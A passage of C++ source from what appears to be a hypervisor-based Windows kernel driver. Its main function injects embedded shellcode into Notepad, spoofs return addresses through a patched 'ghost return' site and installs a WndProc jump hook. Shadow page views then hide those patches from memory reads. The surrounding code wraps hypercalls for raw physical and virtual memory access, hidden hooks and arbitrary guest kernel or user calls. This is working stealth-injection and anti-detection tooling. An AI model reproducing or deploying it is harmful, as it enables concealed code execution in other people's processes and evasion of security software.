    const ULONG spoofPlan = VT_SHELLCODE_SPOOF_PLAN;
    if (!VtWriteProcessPrivate(
            process,
            dataBase + kRuntimeSlotPlanOffset,
            &spoofPlan,
            sizeof(spoofPlan)))
    {
        DBG("[-] Notepad NPT test: RuntimeSlot plan write failed plan=%lu va=0x%llX",
            spoofPlan, dataBase + kRuntimeSlotPlanOffset);
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }
    DBG("[+] Notepad NPT test: RuntimeSlot plan=%lu written va=0x%llX",
        spoofPlan, dataBase + kRuntimeSlotPlanOffset);

#if VT_SHELLCODE_SPOOF_PLAN == 2
    if (VT_SHELLCODE_PLAN2_GHOST_RET_RVA == 0 ||
        imageBase > MAXULONG64 - static_cast<ULONG64>(VT_SHELLCODE_PLAN2_GHOST_RET_RVA))
    {
        DBG("[-] Notepad NPT test: plan2 GhostRetRva is not configured");
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }
    ghostRetVa = imageBase + static_cast<ULONG64>(VT_SHELLCODE_PLAN2_GHOST_RET_RVA);
    if ((ghostRetVa & (PAGE_SIZE - 1)) > PAGE_SIZE - 2 || ghostRetVa < imageBase)
    {
        DBG("[-] Notepad NPT test: plan2 GhostRetVa is not a same-page 2-byte return site va=0x%llX",
            ghostRetVa);
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }

    UCHAR callPrefix[6] = {};
    const BOOLEAN callRead = ghostRetVa >= imageBase + 6 &&
        VtReadProcessPrivate(process, ghostRetVa - 6, callPrefix, sizeof(callPrefix));
    const BOOLEAN directCall = callRead && callPrefix[1] == 0xE8;
    const BOOLEAN indirectCall = callRead && callPrefix[0] == 0xFF && callPrefix[1] == 0x15;
    if (!directCall && !indirectCall)
    {
        DBG("[-] Notepad NPT test: plan2 GhostRetVa is not immediately after E8/FF15 call va=0x%llX",
            ghostRetVa);
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }

    if (!EhInstall((ULONG64)(ULONG_PTR)process, ghostRetVa, FALSE,
                   VT_EH_VIEW_EXEC_SHADOW_READ_ORIGINAL))
    {
        DBG("[-] Notepad NPT test: plan2 GhostRetVa EhInstall failed va=0x%llX", ghostRetVa);
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }
    const UCHAR ghostPatch[] = { 0xFF, 0x23 };
    if (!EhWrite((ULONG64)(ULONG_PTR)process, ghostRetVa, ghostPatch, sizeof(ghostPatch)) ||
        !VtWriteProcessPrivate(process, dataBase + 0x28, &ghostRetVa, sizeof(ghostRetVa)))
    {
        EhRemove((ULONG64)(ULONG_PTR)process, ghostRetVa);
        DBG("[-] Notepad NPT test: plan2 GhostRetVa shadow patch or slot write failed va=0x%llX",
            ghostRetVa);
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }
    ghostInstalled = TRUE;
    DBG("[+] Notepad NPT test: plan2 GhostRetVa installed va=0x%llX source=%s",
        ghostRetVa, directCall ? "E8" : "FF15");
#endif

    s_NotepadShellcodeViewPageCount = 0;
    if (!VtEmbeddedInstallViews(process, codeBase))
    {
        DBG("[-] Notepad NPT test: shellcode dual-view install failed (pid=%llu)", pid);
        if (ghostInstalled)
            EhRemove((ULONG64)(ULONG_PTR)process, ghostRetVa);
        VtEmbeddedRemoveViews(process);
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }
    viewsInstalled = TRUE;
    s_ShellcodeDualViewProcess = (ULONG64)(ULONG_PTR)process;
    s_ShellcodeDualViewShellcodeEntryVa = shellcodeEntryVa;

    UCHAR hookPatch[64] = {};
    RtlFillMemory(hookPatch, hookPatchSize, 0x90);
    hookPatch[0] = 0x48;
    hookPatch[1] = 0xB8;
    RtlCopyMemory(hookPatch + 2, &shellcodeEntryVa, sizeof(shellcodeEntryVa));
    hookPatch[10] = 0xFF;
    hookPatch[11] = 0xE0;
    if (!InstallHookToShellcode((ULONG64)(ULONG_PTR)process, hookVa, shellcodeEntryVa,
                                 hookPatch, hookPatchSize))
    {
        const BOOLEAN restored = VtWriteProcessPrivate(process, hookVa, originalHook, hookPatchSize);
        DBG("[*] Notepad NPT test: failed hook install original bytes restore result=%d size=%lu",
            restored, hookPatchSize);
        DBG("[-] Notepad NPT test: WndProc hook install failed (pid=%llu rva=0x%llX va=0x%llX)",
            pid, hookVa - imageBase, hookVa);
        if (ghostInstalled)
            EhRemove((ULONG64)(ULONG_PTR)process, ghostRetVa);
        if (viewsInstalled)
            VtEmbeddedRemoveViews(process);
        s_ShellcodeDualViewProcess = 0;
        s_ShellcodeDualViewShellcodeEntryVa = 0;
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }

    DBG("[+] Notepad NPT test: WndProc hook bytes installed hook=0x%llX entry=0x%llX size=%lu",
        hookVa, shellcodeEntryVa, hookPatchSize);

    RtlCopyMemory(s_NotepadShellcodeOriginalHook, originalHook, hookPatchSize);
    s_NotepadShellcodeOriginalHookSize = hookPatchSize;
    s_NotepadShellcodeProcess = process;
    s_NotepadShellcodeBase = codeBase;
    s_NotepadShellcodeSize = codeSize;
    s_NotepadShellcodeDataBase = dataBase;
    s_NotepadShellcodeDataSize = dataSize;
    s_NotepadShellcodeHookVa = hookVa;
    s_NotepadGhostRetVa = ghostRetVa;
    InterlockedExchange(&s_NotepadNptState, 2);
    DBG("[+] Notepad NPT test: embedded .text-only shellcode mapped and transparent WndProc hook installed (pid=%llu wndproc_rva=0x%llX hook=0x%llX resume=0x%llX shellcode=0x%llX data=0x%llX patch=%lu views=%lu hook_dual_view=%d shellcode_dual_view=%d)",
        pid, hookVa - imageBase, hookVa, resumeVa, shellcodeEntryVa, dataBase,
        hookPatchSize, s_NotepadShellcodeViewPageCount,
        (int)VT_DEBUG_NOTEPAD_HOOK_DUAL_VIEW, (int)VT_DEBUG_NOTEPAD_SHELLCODE_DUAL_VIEW);
    return TRUE;
#endif
}

VOID VtEngine::PollNotepadShellcodeState(VOID)
{
#if ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST
    const LONG localState = InterlockedCompareExchange(&s_NotepadNptState, 0, 0);
    if (localState != 2 || !s_NotepadShellcodeProcess || !s_NotepadShellcodeDataBase)
    {
        DBG("[*] Notepad NPT test: RuntimeSlot poll skipped local_state=%ld process=%p data=0x%llX",
            localState, s_NotepadShellcodeProcess, s_NotepadShellcodeDataBase);
        return;
    }

    PEPROCESS process = NULL;
    ULONG64 dataBase = 0;
    if (!VtAcquireNotepadShellcodeLease(&process, &dataBase))
        return;

    if (dataBase > MAXULONG64 - kRuntimeSlotStateOffset)
    {
        DBG("[-] Notepad NPT test: RuntimeSlot state address overflow; forcing cleanup");
        VtReleaseNotepadShellcodeLease();
        CleanupNotepadNptTest();
        return;
    }

    if (!g_pGlobalUserVar || !g_pGlobalUserVar->Func.PsGetProcessId)
    {
        DBG("[-] Notepad NPT test: RuntimeSlot poll unavailable global_user=%p PsGetProcessId=%p",
            g_pGlobalUserVar, g_pGlobalUserVar ? g_pGlobalUserVar->Func.PsGetProcessId : NULL);
        VtReleaseNotepadShellcodeLease();
        return;
    }

    const NTSTATUS processExitStatus =
        g_pGlobalUserVar->Func.PsGetProcessExitStatus
            ? g_pGlobalUserVar->Func.PsGetProcessExitStatus(process)
            : STATUS_UNSUCCESSFUL;
    if (processExitStatus != STATUS_PENDING)
    {
        DBG("[-] Notepad NPT test: target process is terminating; skip RuntimeSlot read pid=%llu status=0x%08X",
            (ULONG64)(ULONG_PTR)g_pGlobalUserVar->Func.PsGetProcessId(process), processExitStatus);
        VtReleaseNotepadShellcodeLease();
        CleanupNotepadNptTest();
        return;
    }

    const ULONG64 pid = (ULONG64)(ULONG_PTR)g_pGlobalUserVar->Func.PsGetProcessId(process);
    LONG runtimeState = 0;
    const ULONG64 stateVa = dataBase + kRuntimeSlotStateOffset;
    if (!VtReadProcessPrivate(process, stateVa,
                              &runtimeState, sizeof(runtimeState)))
    {
        DBG("[-] Notepad NPT test: RuntimeSlot process-view state read failed pid=%llu state_va=0x%llX",
            pid, stateVa);
        VtReleaseNotepadShellcodeLease();
        return;
    }

    DBG("[*] Notepad NPT test: RuntimeSlot state=%ld pid=%llu state_va=0x%llX view=target-process",
        runtimeState, pid, stateVa);
    VtReleaseNotepadShellcodeLease();
    if (runtimeState == 3)
    {
        DBG("[-] Notepad NPT test: RuntimeInitWithInput failed; restoring all hooks and views");
        CleanupNotepadNptTest();
    }
#endif
}

VOID VtEngine::CleanupNotepadNptTest(VOID)
{
#if ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST
    const LONG previousState = InterlockedCompareExchange(&s_NotepadNptState, 3, 2);
    DBG("[*] Notepad NPT test: cleanup requested previous_state=%ld process=%p hook=0x%llX views=%lu hook_dual_view=%d",
        previousState, s_NotepadShellcodeProcess, s_NotepadShellcodeHookVa,
        s_NotepadShellcodeViewPageCount, (int)VT_DEBUG_NOTEPAD_HOOK_DUAL_VIEW);
    if (previousState == 1 || previousState == 3)
        return;

    /* 状态先切到 cleaning，阻止新租约；再等已有读取退出后才释放 dataBase。 */
    VtDrainNotepadShellcodeLeases();
    if (s_NotepadShellcodeProcess)
    {
        const ULONG64 process = (ULONG64)(ULONG_PTR)s_NotepadShellcodeProcess;
        const BOOLEAN processTerminating =
            !g_pGlobalUserVar || !g_pGlobalUserVar->Func.PsGetProcessExitStatus ||
            g_pGlobalUserVar->Func.PsGetProcessExitStatus(s_NotepadShellcodeProcess) != STATUS_PENDING;
        if (processTerminating)
        {
            DBG("[*] Notepad NPT test: target process already terminating; skip user VA restore/free process=%p",
                s_NotepadShellcodeProcess);
        }
        if (!processTerminating && IsActive() && s_NotepadShellcodeOriginalHookSize)
        {
#if VT_DEBUG_NOTEPAD_HOOK_DUAL_VIEW
            const BOOLEAN restored = EhWrite(process, s_NotepadShellcodeHookVa,
                                             s_NotepadShellcodeOriginalHook,
                                             s_NotepadShellcodeOriginalHookSize);
            DBG("[*] Notepad NPT test: shadow hook bytes restore result=%d size=%lu",
                restored, s_NotepadShellcodeOriginalHookSize);
#else
            ULONG64 restoreCr3 = 0;
            if (g_pGlobalUserVar && g_pGlobalUserVar->Func.PsGetProcessId)
            {
                const ULONG64 restorePid =
                    (ULONG64)(ULONG_PTR)g_pGlobalUserVar->Func.PsGetProcessId(s_NotepadShellcodeProcess);
                restoreCr3 = QueryProcessCr3(restorePid);
            }
            const BOOLEAN restored = VtWriteProcessPrivate(
                s_NotepadShellcodeProcess, s_NotepadShellcodeHookVa,
                s_NotepadShellcodeOriginalHook, s_NotepadShellcodeOriginalHookSize);
            DBG("[*] Notepad NPT test: process-private original hook bytes restored size=%lu result=%d old_cr3=0x%llX",
                s_NotepadShellcodeOriginalHookSize, restored, restoreCr3);
#endif
        }
    if (s_HookToShellcodeProcess == process)
        {
            if (processTerminating)
            {
                s_HookToShellcodeProcess = 0;
                s_HookToShellcodeHookVa = 0;
                s_HookToShellcodeShellcodeEntryVa = 0;
                DBG("[*] Notepad NPT test: target exited; hook metadata cleared without user VA access");
            }
            else
            {
#if VT_DEBUG_NOTEPAD_HOOK_DUAL_VIEW
            const BOOLEAN removed = RemoveHookToShellcode(process, s_NotepadShellcodeHookVa);
            DBG("[*] Notepad NPT test: hook metadata removed result=%d", removed);
#else
            RemoveHookToShellcode(process, s_NotepadShellcodeHookVa);
            DBG("[*] Notepad NPT test: direct original-page hook metadata cleared");
#endif
            }
        }
        if (s_NotepadGhostRetVa)
        {
            const BOOLEAN ghostRemoved = !processTerminating && IsActive() && EhRemove(process, s_NotepadGhostRetVa);
            DBG("[*] Notepad NPT test: plan2 GhostRetVa removed va=0x%llX result=%d",
                s_NotepadGhostRetVa, ghostRemoved);
            s_NotepadGhostRetVa = 0;
        }
        if (!processTerminating)
        {
            VtEmbeddedRemoveViews(s_NotepadShellcodeProcess);
            VtEmbeddedFree(s_NotepadShellcodeProcess, &s_NotepadShellcodeDataBase, &s_NotepadShellcodeDataSize);
            VtEmbeddedFree(s_NotepadShellcodeProcess, &s_NotepadShellcodeBase, &s_NotepadShellcodeSize);
        }
        else
        {
            s_NotepadShellcodeDataBase = 0;
            s_NotepadShellcodeDataSize = 0;
            s_NotepadShellcodeBase = 0;
            s_NotepadShellcodeSize = 0;
            s_NotepadShellcodeViewPageCount = 0;
            RtlZeroMemory(s_NotepadShellcodeViewPages, sizeof(s_NotepadShellcodeViewPages));
        }
        if (g_pGlobalUserVar && g_pGlobalUserVar->Func.ObfDereferenceObject)
            g_pGlobalUserVar->Func.ObfDereferenceObject(s_NotepadShellcodeProcess);
        s_NotepadShellcodeProcess = NULL;
        s_NotepadShellcodeHookVa = 0;
        s_NotepadShellcodeOriginalHookSize = 0;
        RtlZeroMemory(s_NotepadShellcodeOriginalHook, sizeof(s_NotepadShellcodeOriginalHook));
        s_ShellcodeDualViewProcess = 0;
        s_ShellcodeDualViewShellcodeEntryVa = 0;
        DBG("[*] Notepad NPT test: embedded shellcode cleanup complete (process=%p)", (PVOID)process);
    }
    InterlockedExchange(&s_NotepadNptState, 0);
#endif
    if (!s_NotepadNptProcess)
        return;

    const ULONG64 process = (ULONG64)(ULONG_PTR)s_NotepadNptProcess;
    const ULONG64 va = s_NotepadNptVa;
    const BOOLEAN removed = IsActive() ? EhRemove(process, va) : FALSE;
    if (g_pGlobalUserVar && g_pGlobalUserVar->Func.ObfDereferenceObject)
        g_pGlobalUserVar->Func.ObfDereferenceObject(s_NotepadNptProcess);
    s_NotepadNptProcess = NULL;
    s_NotepadNptVa = 0;
    DBG("[*] Notepad NPT test: cleanup process=%p va=0x%llX removed=%d", (PVOID)process, va, removed);
}

ULONG64 VtEngine::VhInstall(_In_ ULONG64 TargetVa, _In_ ULONG64 HookType, _In_ ULONG64 Process,
                            _In_ BOOLEAN FilterByProcess)
{
    if (!IsActive() || !TargetVa)
    {
        return 0;
    }
    const ULONG64 packed = 1ULL | (FilterByProcess ? 2ULL : 0ULL) | ((HookType & 0xFFULL) << 8);
    return RawHypercall(VT_HC_VH_INSTALL, Process, TargetVa, 0, packed);
}

BOOLEAN VtEngine::VhEnable(_In_ ULONG64 SlotIdx)
{
    if (!IsActive())
    {
        return FALSE;
    }
    return (RawHypercall(VT_HC_VH_ENABLE, 0, SlotIdx) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::VhDisable(_In_ ULONG64 SlotIdx)
{
    if (!IsActive())
    {
        return FALSE;
    }
    return (RawHypercall(VT_HC_VH_DISABLE, 0, SlotIdx) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::VhRemove(_In_ ULONG64 SlotIdx)
{
    if (!IsActive())
    {
        return FALSE;
    }
    return (RawHypercall(VT_HC_VH_REMOVE, 0, SlotIdx) != 0) ? TRUE : FALSE;
}

ULONG64 VtEngine::InstallMmr(_In_ ULONG64 PhysAddr, _In_ ULONG Size, _In_ UCHAR Mode)
{
    if (!IsActive() || !PhysAddr || !Size)
    {
        return 0;
    }
    return RawHypercall(VT_HC_INSTALL_MMR, PhysAddr, (ULONG64)Size, (ULONG64)Mode);
}

BOOLEAN VtEngine::RemoveMmr(_In_ ULONG64 MmrHandle)
{
    if (!IsActive() || !MmrHandle)
    {
        return FALSE;
    }
    RawHypercall(VT_HC_REMOVE_MMR, MmrHandle);
    return TRUE;
}

BOOLEAN VtEngine::RemoveAllMmrs(VOID)
{
    if (!IsActive())
    {
        return FALSE;
    }
    RawHypercall(VT_HC_REMOVE_ALL_MMRS);
    return TRUE;
}

ULONG64 VtEngine::DbgDispatch(_In_ ULONG Subcmd, _In_opt_ const VOID *InBuf, _In_ ULONG64 InSize,
                              _Out_opt_ PVOID OutBuf, _In_ ULONG64 OutSize, _In_ ULONG64 FlagsOrSession)
{
    if (!IsActive())
    {
        return 0xFFFFFFFFULL;
    }
    return RawHypercall(VT_HC_DBG_DISPATCH, (ULONG64)Subcmd, (ULONG64)InBuf, InSize, (ULONG64)OutBuf, OutSize,
                        FlagsOrSession);
}

struct VT_CALL_PACKET
{
    VT_DBG_PACKET_HEADER Header;
    vt_call_request Request;
};

static_assert(sizeof(VT_CALL_PACKET) == sizeof(VT_DBG_PACKET_HEADER) + sizeof(vt_call_request),
              "Call packet ABI drift");

static BOOLEAN VtCallTargetMatchesMode(_In_ ULONG Mode, _In_ ULONG64 Target)
{
    const ULONG64 top = Target >> 47;
    if (Mode == VT_CALL_MODE_USER)
        return top == 0;
    if (Mode == VT_CALL_MODE_KERNEL)
        return top == 0x1FFFFull;
    return FALSE;
}

BOOLEAN VtEngine::CallGuestRaw(_In_ ULONG Mode,
                               _In_ ULONG64 Target,
                               _In_reads_opt_(ArgCount) const ULONG64 *Args,
                               _In_ ULONG ArgCount,
                               _Out_ PULONG64 ReturnValue)
{
    if (!ReturnValue || !Target || ArgCount > VT_CALL_MAX_ARGS ||
        (ArgCount && !Args) || !VtCallTargetMatchesMode(Mode, Target) ||
        !IsActive() || !IsPayloadResident())
    {
        return FALSE;
    }

    VT_CALL_PACKET packet = {};
    packet.Header.Magic = VT_DBG_MAGIC;
    packet.Header.Version = VT_DBG_ABI_VERSION;
    packet.Header.Size = sizeof(packet);
    packet.Header.Subcmd = (Mode == VT_CALL_MODE_USER) ? VT_DBG_CALL_USER : VT_DBG_CALL_KERNEL;
    packet.Request.magic = VT_CALL_API_MAGIC;
    packet.Request.version = VT_CALL_API_VERSION;
    packet.Request.size = sizeof(packet.Request);
    packet.Request.mode = Mode;
    packet.Request.arg_count = ArgCount;
    packet.Request.target = Target;
    if (ArgCount)
        RtlCopyMemory(packet.Request.args, Args, ArgCount * sizeof(ULONG64));

    vt_call_response response = {};
    const ULONG64 dispatch_status = DbgDispatch(
        packet.Header.Subcmd,
        &packet,
        sizeof(packet),
        &response,
        sizeof(response));
    if (dispatch_status != 0 || response.magic != VT_CALL_API_MAGIC ||
        response.version != VT_CALL_API_VERSION || response.size != sizeof(response) ||
        response.status != VT_CALL_STATUS_OK || response.mode != Mode ||
        response.target != Target)
    {
        *ReturnValue = 0;
        return FALSE;
    }

    *ReturnValue = response.return_value;
    return TRUE;
}

BOOLEAN VtEngine::CallUserRaw(_In_ ULONG64 Target,
                              _In_reads_opt_(ArgCount) const ULONG64 *Args,
                              _In_ ULONG ArgCount,
                              _Out_ PULONG64 ReturnValue)
{
    return CallGuestRaw(VT_CALL_MODE_USER, Target, Args, ArgCount, ReturnValue);
}

BOOLEAN VtEngine::CallKernelRaw(_In_ ULONG64 Target,
                                _In_reads_opt_(ArgCount) const ULONG64 *Args,
                                _In_ ULONG ArgCount,
                                _Out_ PULONG64 ReturnValue)
{
    return CallGuestRaw(VT_CALL_MODE_KERNEL, Target, Args, ArgCount, ReturnValue);
}

#else // !ENABLE_VT_FRAMEWORK

BOOLEAN VtEngine::Initialize(_In_opt_ PMACHENIKE_KERNEL_INTERFACE UserVar, _In_ ULONG BootFlags)
{
    UNREFERENCED_PARAMETER(UserVar);
    UNREFERENCED_PARAMETER(BootFlags);
    return FALSE;
}

VOID VtEngine::Cleanup(_In_opt_ PMACHENIKE_KERNEL_INTERFACE UserVar)
{
    UNREFERENCED_PARAMETER(UserVar);
}

BOOLEAN VtEngine::RunNotepadNptTest(_In_ PMACHENIKE_KERNEL_INTERFACE UserVar)
{
    UNREFERENCED_PARAMETER(UserVar);
    return FALSE;
}

VOID VtEngine::PollNotepadShellcodeState(VOID)
{
}

VOID VtEngine::CleanupNotepadNptTest(VOID)
{
}

BOOLEAN VtEngine::IsActive(VOID)
{
    return FALSE;
}

BOOLEAN VtEngine::IsPayloadResident(VOID)
{
    return FALSE;
}

ULONG64 VtEngine::RawHypercall(_In_ VT_HYPERCALL_CODE Code, _In_ ULONG64 Arg0, _In_ ULONG64 Arg1, _In_ ULONG64 Arg2,
                               _In_ ULONG64 Arg3, _In_ ULONG64 Arg4, _In_ ULONG64 Arg5)
{
    UNREFERENCED_PARAMETER(Code);
    UNREFERENCED_PARAMETER(Arg0);
    UNREFERENCED_PARAMETER(Arg1);
    UNREFERENCED_PARAMETER(Arg2);
    UNREFERENCED_PARAMETER(Arg3);
    UNREFERENCED_PARAMETER(Arg4);
    UNREFERENCED_PARAMETER(Arg5);
    return 0;
}

BOOLEAN VtEngine::PingHv(VOID)
{
    return FALSE;
}
BOOLEAN VtEngine::PingPayload(_In_ ULONG64 Nonce, _Out_opt_ PULONG64 OutPong)
{
    UNREFERENCED_PARAMETER(Nonce);
    if (OutPong)
        *OutPong = 0;
    return FALSE;
}
BOOLEAN VtEngine::GetPayloadStatus(_Out_ payload_status *OutStatus)
{
    UNREFERENCED_PARAMETER(OutStatus);
    return FALSE;
}
BOOLEAN VtEngine::GetResidentHvDiag(_Out_ mapctl_hv_diag *OutDiag)
{
    UNREFERENCED_PARAMETER(OutDiag);
    return FALSE;
}
BOOLEAN VtEngine::SetPayloadMode(_In_ ULONG64 Kind, _In_ ULONG64 Mode)
{
    UNREFERENCED_PARAMETER(Kind);
    UNREFERENCED_PARAMETER(Mode);
    return FALSE;
}
ULONG64 VtEngine::GetPhysicalAddress(_In_ ULONG64 Cr3, _In_ ULONG64 Va)
{
    UNREFERENCED_PARAMETER(Cr3);
    UNREFERENCED_PARAMETER(Va);
    return 0;
}
ULONG64 VtEngine::QueryProcessCr3(_In_ ULONG64 TargetPid)
{
    UNREFERENCED_PARAMETER(TargetPid);
    return 0;
}
ULONG64 VtEngine::ReadPhysicalMemory(_In_ ULONG64 PhysAddr, _Out_writes_bytes_(Size) PVOID Buffer, _In_ ULONG Size)
{
    UNREFERENCED_PARAMETER(PhysAddr);
    UNREFERENCED_PARAMETER(Buffer);
    UNREFERENCED_PARAMETER(Size);
    return 0;
}
ULONG64 VtEngine::WritePhysicalMemory(_In_ ULONG64 PhysAddr, _In_reads_bytes_(Size) const VOID *Buffer, _In_ ULONG Size)
{
    UNREFERENCED_PARAMETER(PhysAddr);
    UNREFERENCED_PARAMETER(Buffer);
    UNREFERENCED_PARAMETER(Size);
    return 0;
}
ULONG64 VtEngine::ReadVirtualMemory(_In_ ULONG64 Cr3, _In_ ULONG64 Va, _Out_writes_bytes_(Size) PVOID Buffer,
                                    _In_ ULONG Size)
{
    UNREFERENCED_PARAMETER(Cr3);
    UNREFERENCED_PARAMETER(Va);
    UNREFERENCED_PARAMETER(Buffer);
    UNREFERENCED_PARAMETER(Size);
    return 0;
}
ULONG64 VtEngine::WriteVirtualMemory(_In_ ULONG64 Cr3, _In_ ULONG64 Va, _In_reads_bytes_(Size) const VOID *Buffer,
                                     _In_ ULONG Size)
{
    UNREFERENCED_PARAMETER(Cr3);
    UNREFERENCED_PARAMETER(Va);
    UNREFERENCED_PARAMETER(Buffer);
    UNREFERENCED_PARAMETER(Size);
    return 0;
}
BOOLEAN VtEngine::EhInstall(_In_ ULONG64 Process, _In_ ULONG64 Va, _In_ BOOLEAN FullZero, _In_ ULONG ViewMode)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(Va);
    UNREFERENCED_PARAMETER(FullZero);
    UNREFERENCED_PARAMETER(ViewMode);
    return FALSE;
}
BOOLEAN VtEngine::EhRemove(_In_ ULONG64 Process, _In_ ULONG64 Va)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(Va);
    return FALSE;
}
BOOLEAN VtEngine::EhEnable(_In_ ULONG64 Process, _In_ ULONG64 Va)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(Va);
    return FALSE;
}
BOOLEAN VtEngine::EhDisable(_In_ ULONG64 Process, _In_ ULONG64 Va)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(Va);
    return FALSE;
}
BOOLEAN VtEngine::EhWrite(_In_ ULONG64 Process, _In_ ULONG64 Va, _In_ const VOID *Buffer, _In_ ULONG64 Size)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(Va);
    UNREFERENCED_PARAMETER(Buffer);
    UNREFERENCED_PARAMETER(Size);
    return FALSE;
}
ULONG64 VtEngine::EhGetFakeVa(_In_ ULONG64 Process, _In_ ULONG64 Va)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(Va);
    return 0;
}
BOOLEAN VtEngine::EhRemoveAllByProcess(_In_ ULONG64 Process)
{
    UNREFERENCED_PARAMETER(Process);
    return FALSE;
}
BOOLEAN VtEngine::InstallShellcodeDualView(_In_ ULONG64 Process,
                                           _In_ ULONG64 ShellcodeEntryVa)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(ShellcodeEntryVa);
    return FALSE;
}
BOOLEAN VtEngine::RemoveShellcodeDualView(_In_ ULONG64 Process,
                                          _In_ ULONG64 ShellcodeEntryVa)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(ShellcodeEntryVa);
    return FALSE;
}
BOOLEAN VtEngine::InstallHookToShellcode(_In_ ULONG64 Process,
                                         _In_ ULONG64 HookVa,
                                         _In_ ULONG64 ShellcodeEntryVa,
                                         _In_reads_bytes_(HookPatchSize) const VOID *HookPatch,
                                         _In_ ULONG HookPatchSize)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(HookVa);
    UNREFERENCED_PARAMETER(ShellcodeEntryVa);
    UNREFERENCED_PARAMETER(HookPatch);
    UNREFERENCED_PARAMETER(HookPatchSize);
    return FALSE;
}
BOOLEAN VtEngine::InstallHookToShellcodeEntry(_In_ ULONG64 Process,
                                               _In_ ULONG64 HookVa,
                                               _In_ ULONG64 ShellcodeEntryVa,
                                               _In_ ULONG HookPatchSize)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(HookVa);
    UNREFERENCED_PARAMETER(ShellcodeEntryVa);
    UNREFERENCED_PARAMETER(HookPatchSize);
    return FALSE;
}
BOOLEAN VtEngine::RemoveHookToShellcode(_In_ ULONG64 Process,
                                        _In_ ULONG64 HookVa)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(HookVa);
    return FALSE;
}
BOOLEAN VtEngine::InstallShellcodeDualView(_In_ ULONG64 Process,
                                           _In_ ULONG64 HookVa,
                                           _In_ ULONG64 ShellcodeEntryVa,
                                           _In_reads_bytes_(HookPatchSize) const VOID *HookPatch,
                                           _In_ ULONG HookPatchSize)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(HookVa);
    UNREFERENCED_PARAMETER(ShellcodeEntryVa);
    UNREFERENCED_PARAMETER(HookPatch);
    UNREFERENCED_PARAMETER(HookPatchSize);
    return FALSE;
}
BOOLEAN VtEngine::RemoveShellcodeDualView(_In_ ULONG64 Process,
                                          _In_ ULONG64 HookVa,
                                          _In_ ULONG64 ShellcodeEntryVa)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(HookVa);
    UNREFERENCED_PARAMETER(ShellcodeEntryVa);
    return FALSE;
}
ULONG64 VtEngine::VhInstall(_In_ ULONG64 TargetVa, _In_ ULONG64 HookType, _In_ ULONG64 Process,
                            _In_ BOOLEAN FilterByProcess)
{
    UNREFERENCED_PARAMETER(TargetVa);
    UNREFERENCED_PARAMETER(HookType);
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(FilterByProcess);
    return 0;
}
BOOLEAN VtEngine::VhEnable(_In_ ULONG64 SlotIdx)
{
    UNREFERENCED_PARAMETER(SlotIdx);
    return FALSE;
}
BOOLEAN VtEngine::VhDisable(_In_ ULONG64 SlotIdx)
{
    UNREFERENCED_PARAMETER(SlotIdx);
    return FALSE;
}
BOOLEAN VtEngine::VhRemove(_In_ ULONG64 SlotIdx)
{
    UNREFERENCED_PARAMETER(SlotIdx);
    return FALSE;
}
ULONG64 VtEngine::InstallMmr(_In_ ULONG64 PhysAddr, _In_ ULONG Size, _In_ UCHAR Mode)
{
    UNREFERENCED_PARAMETER(PhysAddr);
    UNREFERENCED_PARAMETER(Size);
    UNREFERENCED_PARAMETER(Mode);
    return 0;
}
BOOLEAN VtEngine::RemoveMmr(_In_ ULONG64 MmrHandle)
{
    UNREFERENCED_PARAMETER(MmrHandle);
    return FALSE;
}
BOOLEAN VtEngine::RemoveAllMmrs(VOID)
{
    return FALSE;
}
ULONG64 VtEngine::DbgDispatch(_In_ ULONG Subcmd, _In_opt_ const VOID *InBuf, _In_ ULONG64 InSize,
